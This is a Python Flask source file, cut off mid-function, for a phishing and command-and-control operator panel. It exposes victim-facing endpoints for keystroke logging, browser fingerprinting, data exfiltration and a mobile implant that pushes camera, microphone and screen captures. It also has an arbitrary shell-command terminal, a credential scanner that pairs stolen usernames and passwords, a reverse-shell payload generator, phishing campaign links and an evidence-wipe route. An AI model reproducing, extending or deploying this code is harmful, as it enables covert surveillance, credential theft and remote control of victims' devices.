from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, make_response, Response
import os
import json
import re
import base64
import subprocess
import hashlib
import zipfile
import io
import time
import platform
import psutil
from datetime import datetime, timedelta
from collections import defaultdict
from functools import wraps

import uuid as uuid_module

import database as db

BASE_DIR = os.path.dirname(__file__)
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
FLASK_TEMPLATES_DIR = os.path.join(BASE_DIR, 'flask_templates')
CHECK_C_PATH = os.path.join(BASE_DIR, 'check-c.json')
PHP_CONFIG_PATH = os.path.join(BASE_DIR, 'config.php')

# Shared state (moved from app.py module level into storm-web/app/state.py so
# blueprints can import verbatim; HANDOFF plan section P3).  Object identity
# is preserved -- every reference in app.py / blueprints resolves to the same
# dict / function in app.state.
from app.state import (
    CONFIG,
    LOGIN_FAILS as _LOGIN_FAILS,
    ANALYTICS,
    C2_SESSIONS, C2_COMMANDS, C2_RESPONSES, C2_FILE_LISTS, C2_DOWNLOADS,
    MOBILE_SESSIONS, MOBILE_COMMANDS, MOBILE_RESPONSES,
    MOBILE_CAMERA_IMAGES, MOBILE_CAPTURE_DIRS, MOBILE_TRACKING_DATA,
    WEBRTC_LEAKS, RECON_CONFIG,
    load_php_config,
    load_check_c,
    save_check_c,
    generate_token,
    change_token,
    track_event,
    send_notification,
)

# === Flask construction delegated to app.create_app() (HANDOFF plan §P2.4) ===
# The factory in storm-web/app/__init__.py now owns the Flask instance,
# the persisted secret_key, and the MAX_CONTENT_LENGTH override that this
# module used to do inline.  See app/__init__.py for the verbatim behaviour
# re-implementation.  Route definitions, module-level globals, and the
# @app.before_request hooks below remain untouched (NR-2 ADD-only).
from app import create_app
app = create_app()

# ===== GLOBAL AUTH GATE (fix for vuln dc999286: unauth read APIs on public URL) =====
_VICTIM_PUBLIC_PATHS = {
    '/login', '/login.php', '/logout', '/logout.php', '/index.php', '/favicon.ico',
    '/receiver', '/receiver.php',
    '/api/fingerprint', '/api/keystrokes',
    '/api/session/start', '/api/session/events', '/api/session/end',
    '/api/c2/register', '/api/c2/poll', '/api/c2/response',
    '/api/c2/file_list_response', '/api/c2/file_download_response',
    '/api/mobile/register', '/api/mobile/poll', '/api/mobile/response',
    '/api/mobile/camera', '/api/mobile/background_data',
    '/api/mobile/screenshot', '/api/mobile/audio', '/api/mobile/screen_record',
    '/api/browser-exfil/receive', '/api/network/receive',
}
_VICTIM_PUBLIC_PREFIXES = ('/t/', '/assets/', '/c/')

@app.before_request
def _auth_gate():
    path = request.path
    if path in _VICTIM_PUBLIC_PATHS:
        return None
    if any(path.startswith(p) for p in _VICTIM_PUBLIC_PREFIXES):
        return None
    if session.get('IAm-logined'):
        return None
    if path.startswith('/api/') or path.endswith('.php'):
        return jsonify({'error': 'Unauthorized'}), 401
    return redirect('/login')

# ===== login brute-force lockout (fix: public URL + default creds) =====
import time as _time
# _LOGIN_FAILS now imported from app.state (above). Keep local name for the
# decorator bodies below verbatim.

@app.before_request
def _login_throttle():
    if request.path in ('/login', '/login.php') and request.method == 'POST':
        ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '?').split(',')[0].strip()
        rec = _LOGIN_FAILS.get(ip)
        if rec and rec[1] > _time.time():
            return jsonify({'error': 'Too many failed attempts; locked 60s'}), 429

@app.after_request
def _login_throttle_track(resp):
    if request.path in ('/login', '/login.php') and request.method == 'POST':
        ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '?').split(',')[0].strip()
        if resp.status_code in (301, 302):
            _LOGIN_FAILS.pop(ip, None)
        else:
            fails, until = _LOGIN_FAILS.get(ip, (0, 0))
            if until and until <= _time.time():
                fails = 0
            fails += 1
            _LOGIN_FAILS[ip] = (fails, (_time.time() + 60) if fails >= 5 else 0)
    return resp


# ===== ANALYTICS ENGINE =====
# ANALYTICS dict, track_event, load_check_c, save_check_c,
# generate_token, change_token have moved to app.state (HANDOFF plan §P3).
# Object identity preserved -- every reference below hits app.state.*


# Keep legacy asset path used by the original PHP templates (../../assets/...)
@app.route('/assets/<path:filename>')
def legacy_assets(filename):
    return send_from_directory(os.path.join(BASE_DIR, 'assets'), filename)



# Global C2 State (In-memory for simplicity)


# P3.1: moved to app.blueprints.auth -> @index ('/')

# P3.1: moved to app.blueprints.auth -> @login ('/login')

@app.route('/panel')
def panel():
    key = load_check_c()
    cookie = request.cookies.get('logindata')
    if cookie and cookie == key.get('token') and key.get('expired') == 'no':
        if not session.get('IAm-logined'):
            session['IAm-logined'] = 'yes'
        # Initialize CWD for terminal
        if 'cwd' not in session:
            session['cwd'] = os.getcwd()
    elif session.get('IAm-logined'):
        client_token = generate_token()
        resp = make_response(render_template('panel.html', username=session.get('IAm-logined')))
        resp.set_cookie('logindata', client_token, max_age=86400*30, path='/')
        change_token(client_token)
        return resp
    else:
        return redirect(url_for('login'))

    return render_template('panel.html', username=session.get('IAm-logined'))


@app.route('/mobile_control')
def mobile_control():
    """Mobile C2 Control Panel"""
    if not session.get('IAm-logined'):
        return redirect(url_for('login'))
    return render_template('mobile_control.html')


# P3.1: moved to app.blueprints.auth -> @logout ('/logout')

# P3.2: moved to app.blueprints.capture_* -> @receiver ('/receiver')

# P3: moved to app/blueprints/templates.py -> '/list_templates' (list_templates)



@app.route('/api/images')
def get_images():
    """API endpoint to list all captured images"""
    images_dir = os.path.join(BASE_DIR, 'images')
    os.makedirs(images_dir, exist_ok=True)
    
    try:
        files = os.listdir(images_dir)
        images = []
        for f in files:
            if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                file_path = os.path.join(images_dir, f)
                images.append({
                    'name': f,
                    'url': f'/images/{f}',
                    'timestamp': os.path.getmtime(file_path)
                })
        # Sort by timestamp descending (newest first)
        images.sort(key=lambda x: x['timestamp'], reverse=True)
        return jsonify({'images': images})
    except Exception as e:
        return jsonify({'error': str(e), 'images': []}), 500


@app.route('/api/audio')
def get_audio():
    """API endpoint to list all recorded audio files"""
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    os.makedirs(sounds_dir, exist_ok=True)
    
    try:
        files = os.listdir(sounds_dir)
        audio_files = []
        for f in files:
            if f.lower().endswith(('.wav', '.mp3', '.m4a', '.ogg', '.webm')):
                file_path = os.path.join(sounds_dir, f)
                audio_files.append({
                    'name': f,
                    'url': f'/sounds/{f}',
                    'timestamp': os.path.getmtime(file_path)
                })
        # Sort by timestamp descending (newest first)
        audio_files.sort(key=lambda x: x['timestamp'], reverse=True)
        return jsonify({'audio': audio_files})
    except Exception as e:
        return jsonify({'error': str(e), 'audio': []}), 500


@app.route('/images/<filename>')
def serve_image(filename):
    """Serve captured images"""
    images_dir = os.path.join(BASE_DIR, 'images')
    return send_from_directory(images_dir, filename)


@app.route('/sounds/<filename>')
def serve_sound(filename):
    """Serve recorded audio files"""
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    return send_from_directory(sounds_dir, filename)


# Compatibility routes for original PHP filenames (avoid 404s from existing JS)
# P3: moved to app/blueprints/templates.py -> '/list_templates.php' (list_templates_php)


@app.route('/panel.php')
def panel_php():
    return panel()


@app.route('/t/<name>/post.php', methods=['POST'])
def template_post_php(name):
    return template_post(name)


@app.route('/t/<name>/handler.php', methods=['POST'])
def template_handler_php(name):
    return template_handler(name)


@app.route('/api/images.php')
def get_images_php():
    return get_images()


@app.route('/api/audio.php')
def get_audio_php():
    return get_audio()


@app.route('/api/delete_images', methods=['POST'])
def delete_images():
    images_dir = os.path.join(BASE_DIR, 'images')
    if os.path.exists(images_dir):
        for f in os.listdir(images_dir):
            file_path = os.path.join(images_dir, f)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception:
                pass
    return 'OK'


@app.route('/api/delete_audio', methods=['POST'])
def delete_audio():
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    if os.path.exists(sounds_dir):
        for f in os.listdir(sounds_dir):
            file_path = os.path.join(sounds_dir, f)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception:
                pass
    return 'OK'


@app.route('/api/delete_images.php', methods=['POST'])
def delete_images_php():
    return delete_images()


@app.route('/api/delete_audio.php', methods=['POST'])
def delete_audio_php():
    return delete_audio()


# P3: moved to app/blueprints/templates.py -> '/t/<name>/' (serve_template_index)



def send_notification(message_data):
    pass  # moved to app.state.send_notification; placeholder kept here so app.py
          # has the same module-level name as before (reference docs / extensions).


# P3: moved to app/blueprints/templates.py -> '/api/save_settings' (save_settings)



# P3: moved to app/blueprints/templates.py -> '/api/get_settings' (get_settings)



# P3: moved to app/blueprints/templates.py -> '/t/<name>/<path:filename>' (serve_template_file)



# P3: moved to app/blueprints/templates.py -> '/t/<name>/handler' (template_handler)



# P3: moved to app/blueprints/templates.py -> '/t/<name>/post' (template_post)



# P3: moved to app/blueprints/templates.py -> '/t/<name>/upload.php' (template_upload_php)



# ===== ADVANCED FEATURES API ENDPOINTS =====

# P3.2: moved to app.blueprints.capture_* -> @save_fingerprint ('/api/fingerprint')

# P3.2: moved to app.blueprints.capture_* -> @save_keystrokes ('/api/keystrokes')

# P3.2: moved to app.blueprints.capture_* -> @session_start ('/api/session/start')

# P3.2: moved to app.blueprints.capture_* -> @session_events ('/api/session/events')

# P3.2: moved to app.blueprints.capture_* -> @session_end ('/api/session/end')

@app.route('/api/terminal', methods=['POST'])
def terminal_exec():
    """Handle terminal commands execution"""
    try:
        if not session.get('IAm-logined'):
            return jsonify({'error': 'Unauthorized', 'output': 'Unauthorized access'}), 401

        data = request.json
        cmd = data.get('cmd', '').strip()
        
        # Get current working directory from session or default
        cwd = session.get('cwd', os.getcwd())
        
        # Verify CWD exists, if not reset to default
        if not os.path.exists(cwd):
            cwd = os.getcwd()
            session['cwd'] = cwd

        if not cmd:
            return jsonify({'output': '', 'cwd': cwd})

        # Handle Directory Changes (cd)
        if cmd.startswith('cd '):
            new_dir_part = cmd[3:].strip()
            # Handle "cd" (home) or "cd ~"
            if not new_dir_part or new_dir_part == '~':
                new_path = os.path.expanduser('~')
            else:
                new_path = os.path.join(cwd, new_dir_part)
            
            # Resolve relative paths (..)
            new_path = os.path.abspath(new_path)
            
            if os.path.isdir(new_path):
                session['cwd'] = new_path
                return jsonify({'output': '', 'cwd': new_path})
            else:
                return jsonify({'output': f"cd: {new_dir_part}: No such file or directory", 'cwd': cwd})

        # Process standard commands
        try:
            # Use specific shell based on OS
            shell_cmd = cmd
            if os.name == 'nt':
                # Windows: we might want to capture stderr too
                # Using shell=True for internal commands like dir, echo
                completion = subprocess.run(shell_cmd, cwd=cwd, shell=True, capture_output=True, text=True)
            else:
                completion = subprocess.run(shell_cmd, cwd=cwd, shell=True, capture_output=True, text=True, executable='/bin/bash')
            
            output = completion.stdout
            if completion.stderr:
                output += "\n" + completion.stderr
                
            return jsonify({'output': output, 'cwd': cwd})
            
        except Exception as e:
            return jsonify({'output': str(e), 'cwd': cwd})
            
    except Exception as e:
        return jsonify({'error': str(e), 'output': f"Server Error: {str(e)}"}), 500


# ===== C2 / REMOTE SHELL ENDPOINTS =====

# P3.3: moved to app.blueprints.capture_c2 -> @c2_register ('/api/c2/register')

# P3.3: moved to app.blueprints.capture_c2 -> @c2_poll ('/api/c2/poll')

# P3.3: moved to app.blueprints.capture_c2 -> @c2_response ('/api/c2/response')
# P3.3: moved to app.blueprints.capture_c2 -> @c2_list_clients ('/api/c2/clients')

# P3.3: moved to app.blueprints.capture_c2 -> @c2_queue_command ('/api/c2/queue_command')

# P3.3: moved to app.blueprints.capture_c2 -> @c2_get_responses ('/api/c2/get_responses/<uid>')

# P3.3: moved to app.blueprints.capture_c2 -> @c2_get_file_list ('/api/c2/get_file_list/<uid>')

# P3.3: moved to app.blueprints.capture_c2 -> @c2_get_download ('/api/c2/get_download/<uid>')

# P3.3: moved to app.blueprints.capture_c2 -> @c2_file_list_response ('/api/c2/file_list_response')

# P3.3: moved to app.blueprints.capture_c2 -> @c2_file_download_response ('/api/c2/file_download_response')
# ===== MOBILE BACKDOOR ENDPOINTS =====

# Global Mobile State
# P3: MOBILE_SESSIONS -> moved to app.state

# P3: MOBILE_COMMANDS -> moved to app.state

# P3: MOBILE_RESPONSES -> moved to app.state

# P3: MOBILE_CAMERA_IMAGES -> moved to app.state


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/register' (mobile_register)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/poll' (mobile_poll)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/response' (mobile_response)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/camera' (mobile_camera)



# ===== MOBILE MEDIA CAPTURES =====
# Media pushed by the mobile implant: screenshots, microphone recordings and
# screen recordings. These are victim-facing endpoints, so they are listed in
# the auth-gate allowlist. Every file is written to disk (so it survives a
# server restart) and indexed in the database for the operator gallery.

# P3: MOBILE_CAPTURE_DIRS (block) -> app.state



def _decode_data_url(payload):
    from app.state import _decode_data_url as _real
    return _real(payload)


def _save_mobile_capture(uid, capture_type, field, extra_meta=None):
    from app.state import _save_mobile_capture as _real
    return _real(uid, capture_type, field, extra_meta)



# moved to app/blueprints/capture_mobile.py -> '/api/mobile/screenshot' (mobile_screenshot)



# moved to app/blueprints/capture_mobile.py -> '/api/mobile/audio' (mobile_audio)



# moved to app/blueprints/capture_mobile.py -> '/api/mobile/screen_record' (mobile_screen_record)



# moved to app/blueprints/capture_mobile.py -> '/api/mobile/captures' (mobile_captures)



@app.route('/videos/<filename>')
def serve_video(filename):
    """Serve captured screen recordings"""
    videos_dir = os.path.join(BASE_DIR, 'videos')
    os.makedirs(videos_dir, exist_ok=True)
    return send_from_directory(videos_dir, filename)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/clients' (mobile_clients)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/send_command' (mobile_send_command)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/get_response/<uid>' (mobile_get_response)



# moved to app/blueprints/capture_mobile.py -> '/api/mobile/background_data' (mobile_background_data)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/tracking_data/<uid>' (mobile_get_tracking_data)



# ===== ADVANCED ANALYTICS API =====

@app.route('/api/analytics/dashboard')
def analytics_dashboard():
    """Real-time dashboard statistics"""
    try:
        images_dir = os.path.join(BASE_DIR, 'images')
        sounds_dir = os.path.join(BASE_DIR, 'sounds')
        fingerprints_dir = os.path.join(BASE_DIR, 'fingerprints')
        keystrokes_dir = os.path.join(BASE_DIR, 'keystrokes')
        sessions_dir = os.path.join(BASE_DIR, 'sessions')
        
        image_count = len([f for f in os.listdir(images_dir) if f.lower().endswith(('.png','.jpg','.jpeg'))]) if os.path.exists(images_dir) else 0
        audio_count = len([f for f in os.listdir(sounds_dir) if f.lower().endswith(('.wav','.mp3','.webm'))]) if os.path.exists(sounds_dir) else 0
        fingerprint_count = len([f for f in os.listdir(fingerprints_dir) if f.endswith('.json')]) if os.path.exists(fingerprints_dir) else 0
        keystroke_count = len([f for f in os.listdir(keystrokes_dir) if f.endswith('.json')]) if os.path.exists(keystrokes_dir) else 0
        session_count = len([f for f in os.listdir(sessions_dir) if f.endswith('_meta.json')]) if os.path.exists(sessions_dir) else 0
        
        # Count active C2 + mobile victims
        active_c2 = sum(1 for s in C2_SESSIONS.values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
        active_mobile = sum(1 for s in MOBILE_SESSIONS.values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
        
        # Disk usage
        total_size = 0
        for dirpath, dirnames, filenames in os.walk(BASE_DIR):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                try:
                    total_size += os.path.getsize(fp)
                except:
                    pass
        
        # System info
        uptime_seconds = (datetime.now() - datetime.fromisoformat(ANALYTICS['start_time'])).total_seconds()
        
        return jsonify({
            'captures': {
                'images': image_count,
                'audio': audio_count,
                'fingerprints': fingerprint_count,
                'keystrokes': keystroke_count,
                'sessions': session_count,
                'total': image_count + audio_count + fingerprint_count + keystroke_count
            },
            'victims': {
                'c2_active': active_c2,
                'c2_total': len(C2_SESSIONS),
                'mobile_active': active_mobile,
                'mobile_total': len(MOBILE_SESSIONS),
                'total_active': active_c2 + active_mobile,
                'total_all': len(C2_SESSIONS) + len(MOBILE_SESSIONS)
            },
            'system': {
                'uptime': int(uptime_seconds),
                'disk_usage': total_size,
                'cpu_percent': psutil.cpu_percent() if psutil else 0,
                'memory_percent': psutil.virtual_memory().percent if psutil else 0,
                'platform': platform.system(),
                'python_version': platform.python_version(),
            },
            'activity': {
                'total_events': len(ANALYTICS['events']),
                'unique_ips': len(ANALYTICS['ip_addresses']),
                'hourly': dict(list(ANALYTICS['hourly_activity'].items())[-24:]),
            },
            'recent_events': ANALYTICS['events'][-20:]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/analytics/timeline')
def analytics_timeline():
    """Get activity timeline data for charts"""
    try:
        hours = int(request.args.get('hours', 24))
        now = datetime.now()
        
        timeline = []
        for i in range(hours, 0, -1):
            hour = (now - timedelta(hours=i)).strftime('%Y-%m-%d %H:00')
            timeline.append({
                'time': hour,
                'label': (now - timedelta(hours=i)).strftime('%H:%M'),
                'count': ANALYTICS['hourly_activity'].get(hour, 0)
            })
        
        return jsonify({'timeline': timeline})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/analytics/geo')
def analytics_geo():
    """Get geolocation data for map visualization"""
    try:
        return jsonify({'locations': ANALYTICS['geo_data'][-200:]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/export/all', methods=['POST'])
def export_all_data():
    """Export all captured data as a ZIP archive"""
    try:
        memory_file = io.BytesIO()
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Export images
            images_dir = os.path.join(BASE_DIR, 'images')
            if os.path.exists(images_dir):
                for f in os.listdir(images_dir):
                    zf.write(os.path.join(images_dir, f), f'images/{f}')
            
            # Export audio
            sounds_dir = os.path.join(BASE_DIR, 'sounds')
            if os.path.exists(sounds_dir):
                for f in os.listdir(sounds_dir):
                    zf.write(os.path.join(sounds_dir, f), f'audio/{f}')
            
            # Export fingerprints
            fp_dir = os.path.join(BASE_DIR, 'fingerprints')
            if os.path.exists(fp_dir):
                for f in os.listdir(fp_dir):
                    zf.write(os.path.join(fp_dir, f), f'fingerprints/{f}')
            
            # Export keystrokes
            ks_dir = os.path.join(BASE_DIR, 'keystrokes')
            if os.path.exists(ks_dir):
                for f in os.listdir(ks_dir):
                    zf.write(os.path.join(ks_dir, f), f'keystrokes/{f}')
            
            # Export sessions
            sess_dir = os.path.join(BASE_DIR, 'sessions')
            if os.path.exists(sess_dir):
                for f in os.listdir(sess_dir):
                    zf.write(os.path.join(sess_dir, f), f'sessions/{f}')
            
            # Export analytics summary
            summary = {
                'exported_at': datetime.now().isoformat(),
                'total_events': len(ANALYTICS['events']),
                'c2_sessions': len(C2_SESSIONS),
                'mobile_sessions': len(MOBILE_SESSIONS),
                'events': ANALYTICS['events'][-100:]
            }
            zf.writestr('analytics_summary.json', json.dumps(summary, indent=2, default=str))
        
        memory_file.seek(0)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        return Response(
            memory_file.read(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename=storm_export_{timestamp}.zip'}
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/system/info')
def system_info():
    """Detailed system information"""
    try:
        info = {
            'hostname': platform.node(),
            'os': f"{platform.system()} {platform.release()}",
            'architecture': platform.machine(),
            'python': platform.python_version(),
            'cpu_count': os.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=0.1) if psutil else 0,
            'memory': {
                'total': psutil.virtual_memory().total if psutil else 0,
                'used': psutil.virtual_memory().used if psutil else 0,
                'percent': psutil.virtual_memory().percent if psutil else 0,
            },
            'disk': {
                'total': psutil.disk_usage('/').total if psutil else 0,
                'used': psutil.disk_usage('/').used if psutil else 0,
                'percent': psutil.disk_usage('/').percent if psutil else 0,
            },
            'network_interfaces': [],
            'uptime': int((datetime.now() - datetime.fromisoformat(ANALYTICS['start_time'])).total_seconds()),
        }
        
        # Network interfaces
        try:
            import socket
            hostname = socket.gethostname()
            info['local_ip'] = socket.gethostbyname(hostname)
            if psutil:
                for iface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            info['network_interfaces'].append({
                                'name': iface,
                                'ip': addr.address,
                                'netmask': addr.netmask
                            })
        except:
            pass
        
        return jsonify(info)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/fingerprints/list')
def list_fingerprints():
    """List all captured fingerprints with details"""
    try:
        fp_dir = os.path.join(BASE_DIR, 'fingerprints')
        os.makedirs(fp_dir, exist_ok=True)
        
        fingerprints = []
        for f in sorted(os.listdir(fp_dir), reverse=True):
            if f.endswith('.json'):
                filepath = os.path.join(fp_dir, f)
                with open(filepath, 'r') as fh:
                    data = json.load(fh)
                    fingerprints.append({
                        'filename': f,
                        'hash': data.get('hash', 'unknown'),
                        'timestamp': os.path.getmtime(filepath),
                        'browser': data.get('basic', {}).get('userAgent', 'Unknown')[:80],
                        'screen': f"{data.get('basic', {}).get('screenWidth', '?')}x{data.get('basic', {}).get('screenHeight', '?')}",
                        'platform': data.get('basic', {}).get('platform', 'Unknown'),
                    })
        
        return jsonify({'fingerprints': fingerprints})
    except Exception as e:
        return jsonify({'error': str(e), 'fingerprints': []}), 500


@app.route('/api/keystrokes/list')
def list_keystrokes():
    """List all captured keystroke logs"""
    try:
        ks_dir = os.path.join(BASE_DIR, 'keystrokes')
        os.makedirs(ks_dir, exist_ok=True)
        
        keystroke_files = []
        for f in sorted(os.listdir(ks_dir), reverse=True):
            if f.endswith('.json'):
                filepath = os.path.join(ks_dir, f)
                with open(filepath, 'r') as fh:
                    data = json.load(fh)
                    logs = data.get('logs', [])
                    keystroke_files.append({
                        'filename': f,
                        'timestamp': os.path.getmtime(filepath),
                        'count': len(logs),
                        'passwords': sum(1 for l in logs if l.get('target', {}).get('type') == 'password'),
                        'url': data.get('url', 'Unknown'),
                    })
        
        return jsonify({'keystrokes': keystroke_files})
    except Exception as e:
        return jsonify({'error': str(e), 'keystrokes': []}), 500


@app.route('/api/keystrokes/view/<filename>')
def view_keystroke_file(filename):
    """View a specific keystroke log file"""
    try:
        filepath = os.path.join(BASE_DIR, 'keystrokes', filename)
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return jsonify(json.load(f))
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/alerts')
def get_alerts():
    """Get active security alerts"""
    alerts = ANALYTICS.get('active_alerts', [])
    return jsonify({'alerts': alerts[-50:]})


@app.route('/api/alerts/add', methods=['POST'])
def add_alert():
    """Add a new alert"""
    data = request.json
    alert = {
        'id': hashlib.md5(str(time.time()).encode()).hexdigest()[:8],
        'title': data.get('title', 'Alert'),
        'message': data.get('message', ''),
        'severity': data.get('severity', 'info'),
        'timestamp': datetime.now().isoformat(),
        'read': False
    }
    ANALYTICS['active_alerts'].append(alert)
    return jsonify({'status': 'added', 'alert': alert})


@app.route('/api/alerts/clear', methods=['POST'])
def clear_alerts():
    """Clear all alerts"""
    ANALYTICS['active_alerts'] = []
    return jsonify({'status': 'cleared'})


@app.route('/api/nuke', methods=['POST'])
def nuke_all_data():
    """Emergency data wipe - delete all captured data"""
    try:
        dirs_to_clean = ['images', 'sounds', 'fingerprints', 'keystrokes', 'sessions', 'clipboard', 'network-scans', 'password-managers', 'social-media']
        deleted = 0
        for d in dirs_to_clean:
            dirpath = os.path.join(BASE_DIR, d)
            if os.path.exists(dirpath):
                for f in os.listdir(dirpath):
                    fp = os.path.join(dirpath, f)
                    try:
                        if os.path.isfile(fp):
                            os.unlink(fp)
                            deleted += 1
                    except:
                        pass
        
        # Clear in-memory data
        ANALYTICS['events'].clear()
        ANALYTICS['geo_data'].clear()
        ANALYTICS['active_alerts'].clear()
        ANALYTICS['ip_addresses'].clear()
        
        return jsonify({'status': 'nuked', 'files_deleted': deleted})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ===== CREDENTIAL INTELLIGENCE API =====

from credential_parser import scan_keystroke_files, scan_fingerprints, scan_sessions, get_credential_stats, pair_credentials

@app.route('/api/credentials/scan', methods=['POST'])
def credentials_scan():
    """Trigger a credential scan across all captured data"""
    try:
        keystroke_creds = scan_keystroke_files()
        fingerprint_creds = scan_fingerprints()
        session_creds = scan_sessions()
        
        all_creds = keystroke_creds + fingerprint_creds + session_creds
        
        # Save to database
        saved = 0
        for cred in all_creds:
            result = db.save_credential(
                cred_type=cred['type'],
                value=cred['value'],
                source=cred.get('source', 'scan'),
                source_file=cred.get('file', ''),
                url=cred.get('url', ''),
                confidence=cred.get('confidence', 50),
            )
            if result:
                saved += 1
        
        # Also save pairs
        pairs = pair_credentials()
        for pair in pairs:
            db.save_credential(
                cred_type='credential_pair',
                value=f"{pair['username']}:{pair['password']}",
                source=pair.get('source', 'pairing'),
                source_file=pair.get('file', ''),
                url=pair.get('url', ''),
                confidence=80,
                paired_username=pair['username'],
                paired_password=pair['password'],
            )
        
        return jsonify({
            'status': 'scan_complete',
            'found': len(all_creds),
            'saved': saved,
            'pairs': len(pairs),
            'breakdown': get_credential_stats()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/credentials/list')
def credentials_list():
    """List all discovered credentials"""
    cred_type = request.args.get('type')
    creds = db.get_credentials(cred_type=cred_type)
    return jsonify({'credentials': creds})


@app.route('/api/credentials/pairs')
def credentials_pairs():
    """Get paired username:password combinations"""
    pairs = db.get_credential_pairs()
    return jsonify({'pairs': pairs})


@app.route('/api/credentials/stats')
def credentials_stats():
    """Get credential statistics"""
    all_creds = db.get_credentials()
    stats = {}
    for cred in all_creds:
        t = cred['cred_type']
        stats[t] = stats.get(t, 0) + 1
    return jsonify({'stats': stats, 'total': len(all_creds)})


@app.route('/api/credentials/delete/<int:cred_id>', methods=['DELETE'])
def credentials_delete(cred_id):
    db.delete_credential(cred_id)
    return jsonify({'status': 'deleted'})


# ===== PAYLOAD GENERATOR API =====

from payload_generator import generate_payload, PAYLOAD_TYPES

@app.route('/api/payloads/types')
def payloads_types():
    """Get available payload types"""
    return jsonify({'types': PAYLOAD_TYPES})


@app.route('/api/payloads/generate', methods=['POST'])
def payloads_generate():
    """Generate a payload"""
    try:
        data = request.json
        payload_type = data.get('type')
        config = {
            'lhost': data.get('lhost', '127.0.0.1'),
            'lport': data.get('lport', '4444'),
            'callback_url': data.get('callback_url', ''),
            'template': data.get('template', ''),
            'obfuscate': data.get('obfuscate', False),
        }
        
        result = generate_payload(payload_type, config)
        if 'error' in result:
            return jsonify(result), 400
        
        track_event('payload_generated', {'type': payload_type})
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ===== CAMPAIGN MANAGEMENT API =====

@app.route('/api/campaigns/list')
def campaigns_list():
    campaigns = db.get_campaigns()
    # Attach link stats to each
    for c in campaigns:
        links = db.get_campaign_links(c['id'])
        c['links'] = links
        c['total_clicks'] = sum(l.get('clicks', 0) for l in links)
        c['total_captures'] = sum(l.get('captures', 0) for l in links)
    return jsonify({'campaigns': campaigns})


@app.route('/api/campaigns/create', methods=['POST'])
def campaigns_create():
    try:
        data = request.json
        campaign_id = db.create_campaign(
            name=data.get('name', 'Untitled'),
            template=data.get('template', ''),
            description=data.get('description', ''),
            callback_url=data.get('callback_url', ''),
        )
        
        # Auto-generate a tracking link
        link_code = uuid_module.uuid4().hex[:8]
        target_url = f"/t/{data.get('template', 'zoom_meeting')}/"
        db.add_campaign_link(campaign_id, link_code, target_url)
        
        track_event('campaign_created', {'name': data.get('name'), 'id': campaign_id})
        return jsonify({'status': 'created', 'id': campaign_id, 'link_code': link_code})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/campaigns/<int:campaign_id>')
def campaigns_get(campaign_id):
    campaign = db.get_campaign(campaign_id)
    if not campaign:
        return jsonify({'error': 'Not found'}), 404
    campaign['links'] = db.get_campaign_links(campaign_id)
    return jsonify({'campaign': campaign})


@app.route('/api/campaigns/<int:campaign_id>', methods=['DELETE'])
def campaigns_delete(campaign_id):
    db.delete_campaign(campaign_id)
    return jsonify({'status': 'deleted'})


@app.route('/api/campaigns/<int:campaign_id>/add_link', methods=['POST'])
def campaigns_add_link(campaign_id):
    data = request.json
    link_code = data.get('code', uuid_module.uuid4().hex[:8])
    target_url = data.get('target_url', '/t/zoom_meeting/')
    db.add_campaign_link(campaign_id, link_code, target_url)
    return jsonify({'status': 'added', 'code': link_code})


# Campaign tracking redirect
@app.route('/c/<link_code>')
def campaign_redirect(link_code):
    """Track campaign click and redirect to template"""
    db.increment_campaign_click(link_code)
    # Find the target URL
    conn = __import__('sqlite3').connect(db.DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT target_url FROM campaign_links WHERE link_code = ?', (link_code,))
    row = cursor.fetchone()
    conn.close()
    if row:
        track_event('campaign_click', {'code': link_code}, request.remote_addr)
        return redirect(row[0])
    return 'Not found', 404


# ===== VICTIM PROFILES API =====

@app.route('/api/profiles/list')
def profiles_list():
    profiles = db.get_victim_profiles()
    return jsonify({'profiles': profiles})


@app.route('/api/profiles/<int:profile_id>')
def profiles_get(profile_id):
    profile = db.get_victim_profile(profile_id)
    if not profile:
        return jsonify({'error': 'Not found'}), 404
    return jsonify({'profile': profile})


@app.route('/api/profiles/build', methods=['POST'])
def profiles_build():
    """Auto-build victim profiles from all collected data"""
    try:
        built = 0
        
        # Build from fingerprints
